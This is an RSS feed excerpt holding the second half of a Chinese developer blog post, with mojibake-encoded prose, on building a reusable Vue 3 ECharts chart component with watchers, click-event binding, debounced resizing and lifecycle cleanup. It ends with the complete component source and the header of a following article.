    <span class="hljs-title function_">emit</span>(<span class="hljs-string">'error'</span>, error <span class="hljs-keyword">as</span> <span class="hljs-title class_">Error</span>);
  }
};
</code></pre>
<h3 data-id="heading-8">4. å“åº”å¼æ›´æ–°æœºåˆ¶</h3>
<p>æ ¸å¿ƒç›®æ ‡ ï¼šå®ç°å›¾è¡¨é…ç½®çš„<code>è‡ªåŠ¨æ›´æ–°</code>ï¼Œå½“ props å˜åŒ–æ—¶å›¾è¡¨èƒ½ç›¸åº”è°ƒæ•´ã€‚</p>
<p>å®ç°ç»†èŠ‚ ï¼š</p>
<ul>
<li>é…ç½®ç›‘å¬ ï¼šä½¿ç”¨ watch ç›‘å¬ option å˜åŒ–ï¼Œè‡ªåŠ¨è°ƒç”¨ setOption æ›´æ–°å›¾è¡¨</li>
<li>ä¸»é¢˜ç›‘å¬ ï¼šç›‘å¬ theme å˜åŒ–ï¼Œè§¦å‘é‡æ–°åˆå§‹åŒ–å›¾è¡¨</li>
<li>å°ºå¯¸ç›‘å¬ ï¼šç›‘å¬ width å’Œ height å˜åŒ–ï¼Œè°ƒç”¨ resize æ–¹æ³•è°ƒæ•´å›¾è¡¨å¤§å°</li>
<li>æ·±åº¦ç›‘å¬ ï¼šå¯¹ option ä½¿ç”¨ deep: true ç¡®ä¿åµŒå¥—å±æ€§å˜åŒ–ä¹Ÿèƒ½è¢«æ£€æµ‹åˆ°</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ç›‘å¬é…ç½®å˜åŒ–</span>
<span class="hljs-title function_">watch</span>(
  <span class="hljs-function">() =&gt;</span> props.<span class="hljs-property">option</span>,
  <span class="hljs-function">(<span class="hljs-params">newOption</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (newOption &amp;&amp; chartInstance) {
      chartInstance.<span class="hljs-title function_">setOption</span>(newOption, <span class="hljs-literal">true</span>);
    }
  },
  { <span class="hljs-attr">deep</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">immediate</span>: <span class="hljs-literal">false</span> }
);

<span class="hljs-comment">// ç›‘å¬ä¸»é¢˜å˜åŒ–</span>
<span class="hljs-title function_">watch</span>(
  <span class="hljs-function">() =&gt;</span> props.<span class="hljs-property">theme</span>,
  <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">initChart</span>();
  }
);

<span class="hljs-comment">// ç›‘å¬å°ºå¯¸å˜åŒ–</span>
<span class="hljs-title function_">watch</span>(
  [<span class="hljs-function">() =&gt;</span> props.<span class="hljs-property">width</span>, <span class="hljs-function">() =&gt;</span> props.<span class="hljs-property">height</span>],
  <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">resize</span>();
  }
);
</code></pre>
<h3 data-id="heading-9">5. äº‹ä»¶å¤„ç†ä¸äº¤äº’</h3>
<p>æ ¸å¿ƒç›®æ ‡ ï¼šå®ç°å›¾è¡¨çš„<code>äº‹ä»¶ç»‘å®šå’Œå¤„ç†</code>ï¼Œæ”¯æŒä¸çˆ¶ç»„ä»¶çš„äº¤äº’ã€‚</p>
<p>å®ç°ç»†èŠ‚ ï¼š</p>
<ul>
<li>äº‹ä»¶å®šä¹‰ ï¼šä½¿ç”¨ defineEmits å®šä¹‰ç»„ä»¶å¯è§¦å‘çš„äº‹ä»¶ï¼ˆå¦‚ chart-event ã€ init ã€ error ï¼‰</li>
<li>äº‹ä»¶ç»‘å®š ï¼šåœ¨ bindEvents å‡½æ•°ä¸­æ ¹æ® functionType ç»‘å®šä¸åŒçš„ç‚¹å‡»äº‹ä»¶</li>
<li>äº‹ä»¶å¤„ç† ï¼šå®ç° handleClickEvent å’Œ handleDialogEvent å¤„ç†å…·ä½“äº‹ä»¶é€»è¾‘</li>
<li>äº‹ä»¶ä¼ é€’ ï¼šé€šè¿‡ emit å°†äº‹ä»¶å‚æ•°ä¼ é€’ç»™çˆ¶ç»„ä»¶</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> emit = defineEmits&lt;{
  <span class="hljs-string">'chart-event'</span>: [<span class="hljs-attr">params</span>: <span class="hljs-title class_">ECElementEvent</span>];
  <span class="hljs-string">'init'</span>: [<span class="hljs-attr">instance</span>: <span class="hljs-title class_">ECharts</span>];
  <span class="hljs-string">'error'</span>: [<span class="hljs-attr">error</span>: <span class="hljs-title class_">Error</span>];
}&gt;();

<span class="hljs-comment">// ç»‘å®šäº‹ä»¶</span>
<span class="hljs-keyword">const</span> bindEvents = (): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  <span class="hljs-keyword">if</span> (!chartInstance) <span class="hljs-keyword">return</span>;

  <span class="hljs-comment">// ç§»é™¤ç°æœ‰äº‹ä»¶ç›‘å¬</span>
  chartInstance.<span class="hljs-title function_">off</span>(<span class="hljs-string">'click'</span>);

  <span class="hljs-comment">// æ ¹æ® functionType ç»‘å®šä¸åŒäº‹ä»¶</span>
  <span class="hljs-keyword">if</span> (props.<span class="hljs-property">functionType</span> === <span class="hljs-number">1</span> || props.<span class="hljs-property">functionType</span> === <span class="hljs-number">12</span>) {
    chartInstance.<span class="hljs-title function_">on</span>(<span class="hljs-string">'click'</span>, handleClickEvent);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (props.<span class="hljs-property">functionType</span> === <span class="hljs-number">2</span> || props.<span class="hljs-property">functionType</span> === <span class="hljs-number">12</span>) {
    chartInstance.<span class="hljs-title function_">on</span>(<span class="hljs-string">'click'</span>, handleDialogEvent);
  }
};
</code></pre>
<h3 data-id="heading-10">6. ç”Ÿå‘½å‘¨æœŸç®¡ç†</h3>
<p>æ ¸å¿ƒç›®æ ‡ ï¼šåœ¨ç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸä¸åŒé˜¶æ®µæ‰§è¡Œç›¸åº”çš„æ“ä½œï¼Œ<code>ç¡®ä¿å›¾è¡¨æ­£ç¡®åˆå§‹åŒ–å’Œæ¸…ç†</code>ã€‚</p>
<p>å®ç°ç»†èŠ‚ ï¼š</p>
<ul>
<li>ç»„ä»¶æŒ‚è½½ ï¼šåœ¨ onMounted ä¸­åˆå§‹åŒ–å›¾è¡¨å¹¶æ·»åŠ çª—å£ resize äº‹ä»¶ç›‘å¬</li>
<li>å»¶è¿Ÿåˆå§‹åŒ– ï¼šä½¿ç”¨ setTimeout ç¡®ä¿ DOM å®Œå…¨åŠ è½½åå†åˆå§‹åŒ–å›¾è¡¨</li>
<li>ç»„ä»¶å¸è½½ ï¼šåœ¨ onBeforeUnmount ä¸­æ¸…ç†äº‹ä»¶ç›‘å¬å™¨ã€å®šæ—¶å™¨å’Œé”€æ¯å›¾è¡¨å®ä¾‹</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">onMounted</span>(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-comment">// å»¶è¿Ÿåˆå§‹åŒ–ï¼Œç¡®ä¿ DOM å®Œå…¨åŠ è½½</span>
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">initChart</span>();
  }, <span class="hljs-number">100</span>);

  <span class="hljs-comment">// æ·»åŠ çª—å£ resize äº‹ä»¶ç›‘å¬</span>
  <span class="hljs-keyword">if</span> (props.<span class="hljs-property">autoResize</span>) {
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, debouncedResize);
  }
});

<span class="hljs-title function_">onBeforeUnmount</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// æ¸…ç†çª—å£ resize äº‹ä»¶ç›‘å¬</span>
  <span class="hljs-keyword">if</span> (props.<span class="hljs-property">autoResize</span>) {
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'resize'</span>, debouncedResize);
  }

  <span class="hljs-comment">// æ¸…ç†å®šæ—¶å™¨</span>
  <span class="hljs-keyword">if</span> (resizeTimer) {
    <span class="hljs-built_in">clearTimeout</span>(resizeTimer);
  }

  <span class="hljs-comment">// é”€æ¯å›¾è¡¨å®ä¾‹</span>
  <span class="hljs-keyword">if</span> (chartInstance) {
    chartInstance.<span class="hljs-title function_">dispose</span>();
    chartInstance = <span class="hljs-literal">null</span>;
  }
});
</code></pre>
<h3 data-id="heading-11">7. æ€§èƒ½ä¼˜åŒ–æªæ–½</h3>
<p>æ ¸å¿ƒç›®æ ‡ ï¼šé€šè¿‡ä¼˜åŒ–æ‰‹æ®µæå‡ç»„ä»¶æ€§èƒ½ï¼Œå‡å°‘ä¸å¿…è¦çš„è®¡ç®—å’Œæ¸²æŸ“ã€‚</p>
<p>å®ç°ç»†èŠ‚ ï¼š</p>
<ul>
<li>é˜²æŠ–å¤„ç† ï¼šå®ç° debounce å‡½æ•°å¤„ç†çª—å£ resize äº‹ä»¶ï¼Œé¿å…é¢‘ç¹è§¦å‘</li>
<li>åˆç†åˆå§‹åŒ– ï¼šåªåœ¨å¿…è¦æ—¶é‡æ–°åˆå§‹åŒ–å›¾è¡¨ï¼ˆå¦‚ä¸»é¢˜å˜åŒ–ï¼‰</li>
<li>èµ„æºæ¸…ç† ï¼šåœ¨ç»„ä»¶å¸è½½æ—¶å½»åº•æ¸…ç†èµ„æºï¼Œé˜²æ­¢å†…å­˜æ³„æ¼</li>
<li>æ¡ä»¶æ‰§è¡Œ ï¼šåœ¨äº‹ä»¶ç»‘å®šå’Œæ–¹æ³•è°ƒç”¨å‰æ£€æŸ¥å®ä¾‹æ˜¯å¦å­˜åœ¨</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// é˜²æŠ–å‡½æ•°</span>
<span class="hljs-keyword">const</span> debounce = &lt;T <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: any[]) =&gt; any&gt;(
  <span class="hljs-attr">func</span>: T,
  <span class="hljs-attr">delay</span>: number
): <span class="hljs-function">(<span class="hljs-params">(...args: Parameters&lt;T&gt;) =&gt; <span class="hljs-keyword">void</span></span>) =&gt;</span> {
  <span class="hljs-keyword">let</span> <span class="hljs-attr">timer</span>: <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-built_in">setTimeout</span>&gt; | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">return</span> <span class="hljs-function">(<span class="hljs-params">...args: Parameters&lt;T&gt;</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (timer) <span class="hljs-built_in">clearTimeout</span>(timer);
    timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">func</span>(...args);
      timer = <span class="hljs-literal">null</span>;
    }, delay);
  };
};

<span class="hljs-comment">// é˜²æŠ–å¤„ç†çš„ resize å‡½æ•°</span>
<span class="hljs-keyword">const</span> debouncedResize = <span class="hljs-title function_">debounce</span>(resize, props.<span class="hljs-property">debounceDelay</span>);    
</code></pre>
<h3 data-id="heading-12">8. å…¬å…±æ–¹æ³•æš´éœ²</h3>
<p>æ ¸å¿ƒç›®æ ‡ ï¼šå°†å›¾è¡¨å®ä¾‹çš„æ–¹æ³•æš´éœ²ç»™çˆ¶ç»„ä»¶ï¼Œæ”¯æŒæ›´çµæ´»çš„æ“ä½œã€‚</p>
<p>å®ç°ç»†èŠ‚ ï¼š</p>
<ul>
<li>æ–¹æ³•å®šä¹‰ ï¼šå®ç°å¸¸ç”¨çš„å›¾è¡¨æ“ä½œæ–¹æ³•ï¼ˆå¦‚ resize ã€ setOption ã€ dispatchAction ç­‰ï¼‰</li>
<li>æ–¹æ³•æš´éœ² ï¼šä½¿ç”¨ defineExpose å°†è¿™äº›æ–¹æ³•æš´éœ²ç»™çˆ¶ç»„ä»¶</li>
<li>å®ä¾‹è·å– ï¼šæä¾› getInstance æ–¹æ³•ï¼Œå…è®¸çˆ¶ç»„ä»¶ç›´æ¥è·å– ECharts å®ä¾‹</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// é‡æ–°æ¸²æŸ“å›¾è¡¨</span>
<span class="hljs-keyword">const</span> resize = (): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  <span class="hljs-keyword">if</span> (chartInstance) {
    chartInstance.<span class="hljs-title function_">resize</span>();
  }
};

<span class="hljs-comment">// è·å–å›¾è¡¨å®ä¾‹</span>
<span class="hljs-keyword">const</span> getInstance = (): <span class="hljs-title class_">ECharts</span> | <span class="hljs-function"><span class="hljs-params">null</span> =&gt;</span> {
  <span class="hljs-keyword">return</span> chartInstance;
};

<span class="hljs-comment">// è®¾ç½®å›¾è¡¨é…ç½®</span>
<span class="hljs-keyword">const</span> setOption = (<span class="hljs-attr">option</span>: <span class="hljs-title class_">EChartsOption</span>, notMerge?: boolean): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  <span class="hljs-keyword">if</span> (chartInstance) {
    chartInstance.<span class="hljs-title function_">setOption</span>(option, notMerge);
  }
};

<span class="hljs-comment">// æš´éœ²æ–¹æ³•</span>
<span class="hljs-title function_">defineExpose</span>({
  resize,
  getInstance,
  setOption,
  dispatchAction,
  clear,
  showLoading,
  hideLoading
});
</code></pre>
<h2 data-id="heading-13">å®Œæ•´å°è£…ä»£ç ï¼ˆç›´æ¥CVå¯é£Ÿç”¨ï¼‰</h2>
<p>é€šè¿‡<code>é›†ä¸­å¤„ç†åˆå§‹åŒ–ã€é”€æ¯ã€resize é€‚é…</code>ç­‰é€šç”¨é€»è¾‘ï¼Œå®ç°ä»£ç å¤ç”¨ï¼Œé¿å…é‡å¤ç¼–å†™å®ç°ç»†èŠ‚ï¼›æå‡ç»´æŠ¤æ€§ï¼Œ<code>ä¿®æ”¹æ—¶åªéœ€æ›´æ–°ç»„ä»¶ä»£ç </code>ï¼Œæ‰€æœ‰ä½¿ç”¨å¤„è‡ªåŠ¨å—ç›Šï¼›ä¿è¯æ¥å£ä¸€è‡´æ€§ï¼Œå›¢é˜Ÿæˆå‘˜å¯é€šè¿‡<code>ç»Ÿä¸€çš„ props å’Œäº‹ä»¶</code>å¿«é€Ÿé›†æˆï¼›åŒæ—¶ä¾¿äº<code>åŠŸèƒ½æ‰©å±•</code>ï¼ˆå¦‚é˜²æŠ–å¤„ç†ã€é”™è¯¯æ•è·ï¼‰å’Œæå‡ä»£ç å¯è¯»æ€§ï¼Œä½¿çˆ¶ç»„ä»¶æ›´ä¸“æ³¨äºä¸šåŠ¡é€»è¾‘å’Œå›¾è¡¨é…ç½®ï¼Œæœ€ç»ˆå®ç°æ›´é«˜æ•ˆã€å¯é çš„æ•°æ®å¯è§†åŒ–æ–¹æ¡ˆã€‚</p>
<pre><code class="hljs language-js" lang="js">&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"chartRef"</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">"{ height: height, width: width }"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"echarts-container"</span> /&gt;</span></span>
&lt;/template&gt;

&lt;script setup lang="ts"&gt;
import {ref, watch, onMounted, onBeforeUnmount, computed} from 'vue';
import * as echarts from 'echarts';
import type {ECharts, EChartsOption, ECElementEvent, EChartsInitOpts} from 'echarts';

// å®šä¹‰props
interface Props {
  width?: string | number;
  height?: string | number;
  option: EChartsOption;
  functionType?: number;
  debounceDelay?: number;
  theme?: string | null;
  initOpts?: EChartsInitOpts;
  autoResize?: boolean;
}

const emit = defineEmits&lt;{
  'chart-event': [params: ECElementEvent];
  'init': [instance: ECharts];
  'error': [error: Error];
}&gt;();

// æš´éœ²æ–¹æ³•å°†åœ¨æ‰€æœ‰å‡½æ•°å®šä¹‰åæ·»åŠ 

const props = withDefaults(defineProps&lt;Props&gt;(), {
  width: '100%',
  height: '400px',
  functionType: 0,
  debounceDelay: 300,
  theme: null,
  initOpts: () =&gt; ({
    devicePixelRatio: window.devicePixelRatio || 1,
    renderer: 'canvas'
  }),
  autoResize: true
});

const chartRef = ref&lt;HTMLElement | null&gt;(null);
let chartInstance: ECharts | null = null;
const resizeTimer: ReturnType&lt;typeof setTimeout&gt; | null = null;

// è®¡ç®—å®½åº¦å’Œé«˜åº¦
const computedWidth = computed(() =&gt; {
  return typeof props.width === 'number' ? `${props.width}px` : props.width;
});

const computedHeight = computed(() =&gt; {
  return typeof props.height === 'number' ? `${props.height}px` : props.height;
});

// é˜²æŠ–å‡½æ•°
const debounce = &lt;T extends (...args: any[]) =&gt; any&gt;(
  func: T,
  delay: number
): ((...args: Parameters&lt;T&gt;) =&gt; void) =&gt; {
  let timer: ReturnType&lt;typeof setTimeout&gt; | null = null;
  return (...args: Parameters&lt;T&gt;) =&gt; {
    if (timer) clearTimeout(timer);
    timer = setTimeout(() =&gt; {
      func(...args);
      timer = null;
    }, delay);
  };
};

// åˆå§‹åŒ–å›¾è¡¨
const initChart = async (): Promise&lt;void&gt; =&gt; {
  try {
    console.log('ECharts: å¼€å§‹åˆå§‹åŒ–å›¾è¡¨');

    // æ¸…ç†ç°æœ‰å®ä¾‹
    if (chartInstance) {
      chartInstance.dispose();
      chartInstance = null;
    }

    // ç¡®ä¿å…ƒç´ å­˜åœ¨
    if (!chartRef.value) {
      throw new Error('å›¾è¡¨å®¹å™¨å…ƒç´ ä¸å­˜åœ¨');
    }

    // æ£€æŸ¥å…ƒç´ å°ºå¯¸
    const { offsetWidth, offsetHeight } = chartRef.value;
    if (offsetWidth === 0 || offsetHeight === 0) {
      throw new Error('å›¾è¡¨å®¹å™¨å°ºå¯¸ä¸º0ï¼Œè¯·æ£€æŸ¥å®¹å™¨æ ·å¼');
    }

    console.log('ECharts: å›¾è¡¨å®¹å™¨å°ºå¯¸', { width: offsetWidth, height: offsetHeight });

    // åˆå§‹åŒ–å›¾è¡¨å®ä¾‹
    chartInstance = echarts.init(
      chartRef.value,
      props.theme,
      props.initOpts
    );

    console.log('ECharts: å›¾è¡¨å®ä¾‹åˆ›å»ºæˆåŠŸ', chartInstance);

    // ç»‘å®šäº‹ä»¶
    bindEvents();

    // è®¾ç½®å›¾è¡¨é…ç½®
    if (props.option) {
      chartInstance.setOption(props.option, true);
      console.log('ECharts: å›¾è¡¨é…ç½®è®¾ç½®æˆåŠŸ');
    }

    // è§¦å‘åˆå§‹åŒ–å®Œæˆäº‹ä»¶
    emit('init', chartInstance);

    console.log('ECharts: å›¾è¡¨åˆå§‹åŒ–å®Œæˆ');
  } catch (error) {
    console.error('ECharts: å›¾è¡¨åˆå§‹åŒ–å¤±è´¥', error);
    emit('error', error as Error);
  }
};

// ç»‘å®šäº‹ä»¶
const bindEvents = (): void =&gt; {
  if (!chartInstance) return;

  // ç§»é™¤ç°æœ‰äº‹ä»¶ç›‘å¬
  chartInstance.off('click');

  // æ ¹æ® functionType ç»‘å®šä¸åŒäº‹ä»¶
  if (props.functionType === 1 || props.functionType === 12) {
    chartInstance.on('click', handleClickEvent);
  } else if (props.functionType === 2 || props.functionType === 12) {
    chartInstance.on('click', handleDialogEvent);
  }
};

// å¤„ç†ç‚¹å‡»äº‹ä»¶
const handleClickEvent = (params: ECElementEvent): void =&gt; {
  console.log('ECharts: ç‚¹å‡»äº‹ä»¶è§¦å‘', params);

  // é«˜äº®ç‚¹å‡»çš„æ•°æ®ç‚¹
  if (chartInstance &amp;&amp; params.seriesIndex !== undefined &amp;&amp; params.dataIndex !== undefined) {
    chartInstance.dispatchAction({
      type: 'highlight',
      seriesIndex: params.seriesIndex,
      dataIndex: params.dataIndex
    });
  }

  // è§¦å‘è‡ªå®šä¹‰äº‹ä»¶
  emit('chart-event', params);
};

// å¤„ç†å¯¹è¯æ¡†äº‹ä»¶
const handleDialogEvent = (params: ECElementEvent): void =&gt; {
  console.log('ECharts: å¯¹è¯æ¡†äº‹ä»¶è§¦å‘', params);
  emit('chart-event', params);
};

// é‡æ–°æ¸²æŸ“å›¾è¡¨
const resize = (): void =&gt; {
  if (chartInstance) {
    chartInstance.resize();
    console.log('ECharts: å›¾è¡¨å°ºå¯¸è°ƒæ•´');
  }
};

// é˜²æŠ–å¤„ç†çš„ resize å‡½æ•°
const debouncedResize = debounce(resize, props.debounceDelay);

// è·å–å›¾è¡¨å®ä¾‹
const getInstance = (): ECharts | null =&gt; {
  return chartInstance;
};

// è®¾ç½®å›¾è¡¨é…ç½®
const setOption = (option: EChartsOption, notMerge?: boolean): void =&gt; {
  if (chartInstance) {
    chartInstance.setOption(option, notMerge);
    console.log('ECharts: æ‰‹åŠ¨è®¾ç½®å›¾è¡¨é…ç½®');
  }
};

// è§¦å‘å›¾è¡¨åŠ¨ä½œ
const dispatchAction = (action: echarts.Action): void =&gt; {
  if (chartInstance) {
    chartInstance.dispatchAction(action);
    console.log('ECharts: è§¦å‘å›¾è¡¨åŠ¨ä½œ', action);
  }
};

// æ¸…ç©ºå›¾è¡¨
const clear = (): void =&gt; {
  if (chartInstance) {
    chartInstance.clear();
    console.log('ECharts: æ¸…ç©ºå›¾è¡¨');
  }
};

// æ˜¾ç¤ºåŠ è½½åŠ¨ç”»
const showLoading = (type?: string, options?: echarts.LoadingOption): void =&gt; {
  if (chartInstance) {
    chartInstance.showLoading(type, options);
    console.log('ECharts: æ˜¾ç¤ºåŠ è½½åŠ¨ç”»');
  }
};

// éšè—åŠ è½½åŠ¨ç”»
const hideLoading = (): void =&gt; {
  if (chartInstance) {
    chartInstance.hideLoading();
    console.log('ECharts: éšè—åŠ è½½åŠ¨ç”»');
  }
};

// æš´éœ²æ–¹æ³•
defineExpose({
  resize,
  getInstance,
  setOption,
  dispatchAction,
  clear,
  showLoading,
  hideLoading
});

// ç›‘å¬é…ç½®å˜åŒ–
watch(
  () =&gt; props.option,
  (newOption) =&gt; {
    if (newOption &amp;&amp; chartInstance) {
      console.log('ECharts: å›¾è¡¨é…ç½®å˜åŒ–ï¼Œæ›´æ–°å›¾è¡¨');
      chartInstance.setOption(newOption, true);
    }
  },
  { deep: true, immediate: false }
);

// ç›‘å¬ä¸»é¢˜å˜åŒ–
watch(
  () =&gt; props.theme,
  () =&gt; {
    console.log('ECharts: å›¾è¡¨ä¸»é¢˜å˜åŒ–ï¼Œé‡æ–°åˆå§‹åŒ–å›¾è¡¨');
    initChart();
  }
);

// ç›‘å¬å°ºå¯¸å˜åŒ–
watch(
  [() =&gt; props.width, () =&gt; props.height],
  () =&gt; {
    console.log('ECharts: å›¾è¡¨å°ºå¯¸å˜åŒ–ï¼Œè°ƒæ•´å›¾è¡¨');
    resize();
  }
);

onMounted(async () =&gt; {
  console.log('ECharts: ç»„ä»¶æŒ‚è½½');

  // å»¶è¿Ÿåˆå§‹åŒ–ï¼Œç¡®ä¿ DOM å®Œå…¨åŠ è½½
  setTimeout(async () =&gt; {
    await initChart();
  }, 100);

  // æ·»åŠ çª—å£ resize äº‹ä»¶ç›‘å¬
  if (props.autoResize) {
    window.addEventListener('resize', debouncedResize);
    console.log('ECharts: æ·»åŠ çª—å£ resize äº‹ä»¶ç›‘å¬');
  }
});

onBeforeUnmount(() =&gt; {
  console.log('ECharts: ç»„ä»¶å¸è½½');

  // æ¸…ç†çª—å£ resize äº‹ä»¶ç›‘å¬
  if (props.autoResize) {
    window.removeEventListener('resize', debouncedResize);
  }

  // æ¸…ç†å®šæ—¶å™¨
  if (resizeTimer) {
    clearTimeout(resizeTimer);
  }

  // é”€æ¯å›¾è¡¨å®ä¾‹
  if (chartInstance) {
    chartInstance.dispose();
    chartInstance = null;
  }
});
&lt;/script&gt;

&lt;style scoped&gt;
.echarts-container {
  position: relative;
  box-sizing: border-box;
  min-width: 300px;
  min-height: 300px;
  transition: width 0.3s ease, height 0.3s ease;
}
&lt;/style&gt;

</code></pre>
<h2 data-id="heading-14">è°¢è°¢è§‚çœ‹ï¼</h2></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenClaw æ·±åº¦æŠ€æœ¯è§£æ]]></title>    <link>https://juejin.cn/post/7604690250343333938</link>    <guid>https://juejin.cn/post/7604690250343333938</guid>    <pubDate>2026-02-09T08:12:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604690250343333938" data-draft-id="7604345576176926758" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenClaw æ·±åº¦æŠ€æœ¯è§£æ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-02-09T08:12:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="twl"/> <meta itemprop="url" content="https://juejin.cn/user/3016715635534029"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenClaw æ·±åº¦æŠ€æœ¯è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3016715635534029/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    twl
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T08:12:39.000Z" title="Mon Feb 09 2026 08:12:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»20åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol 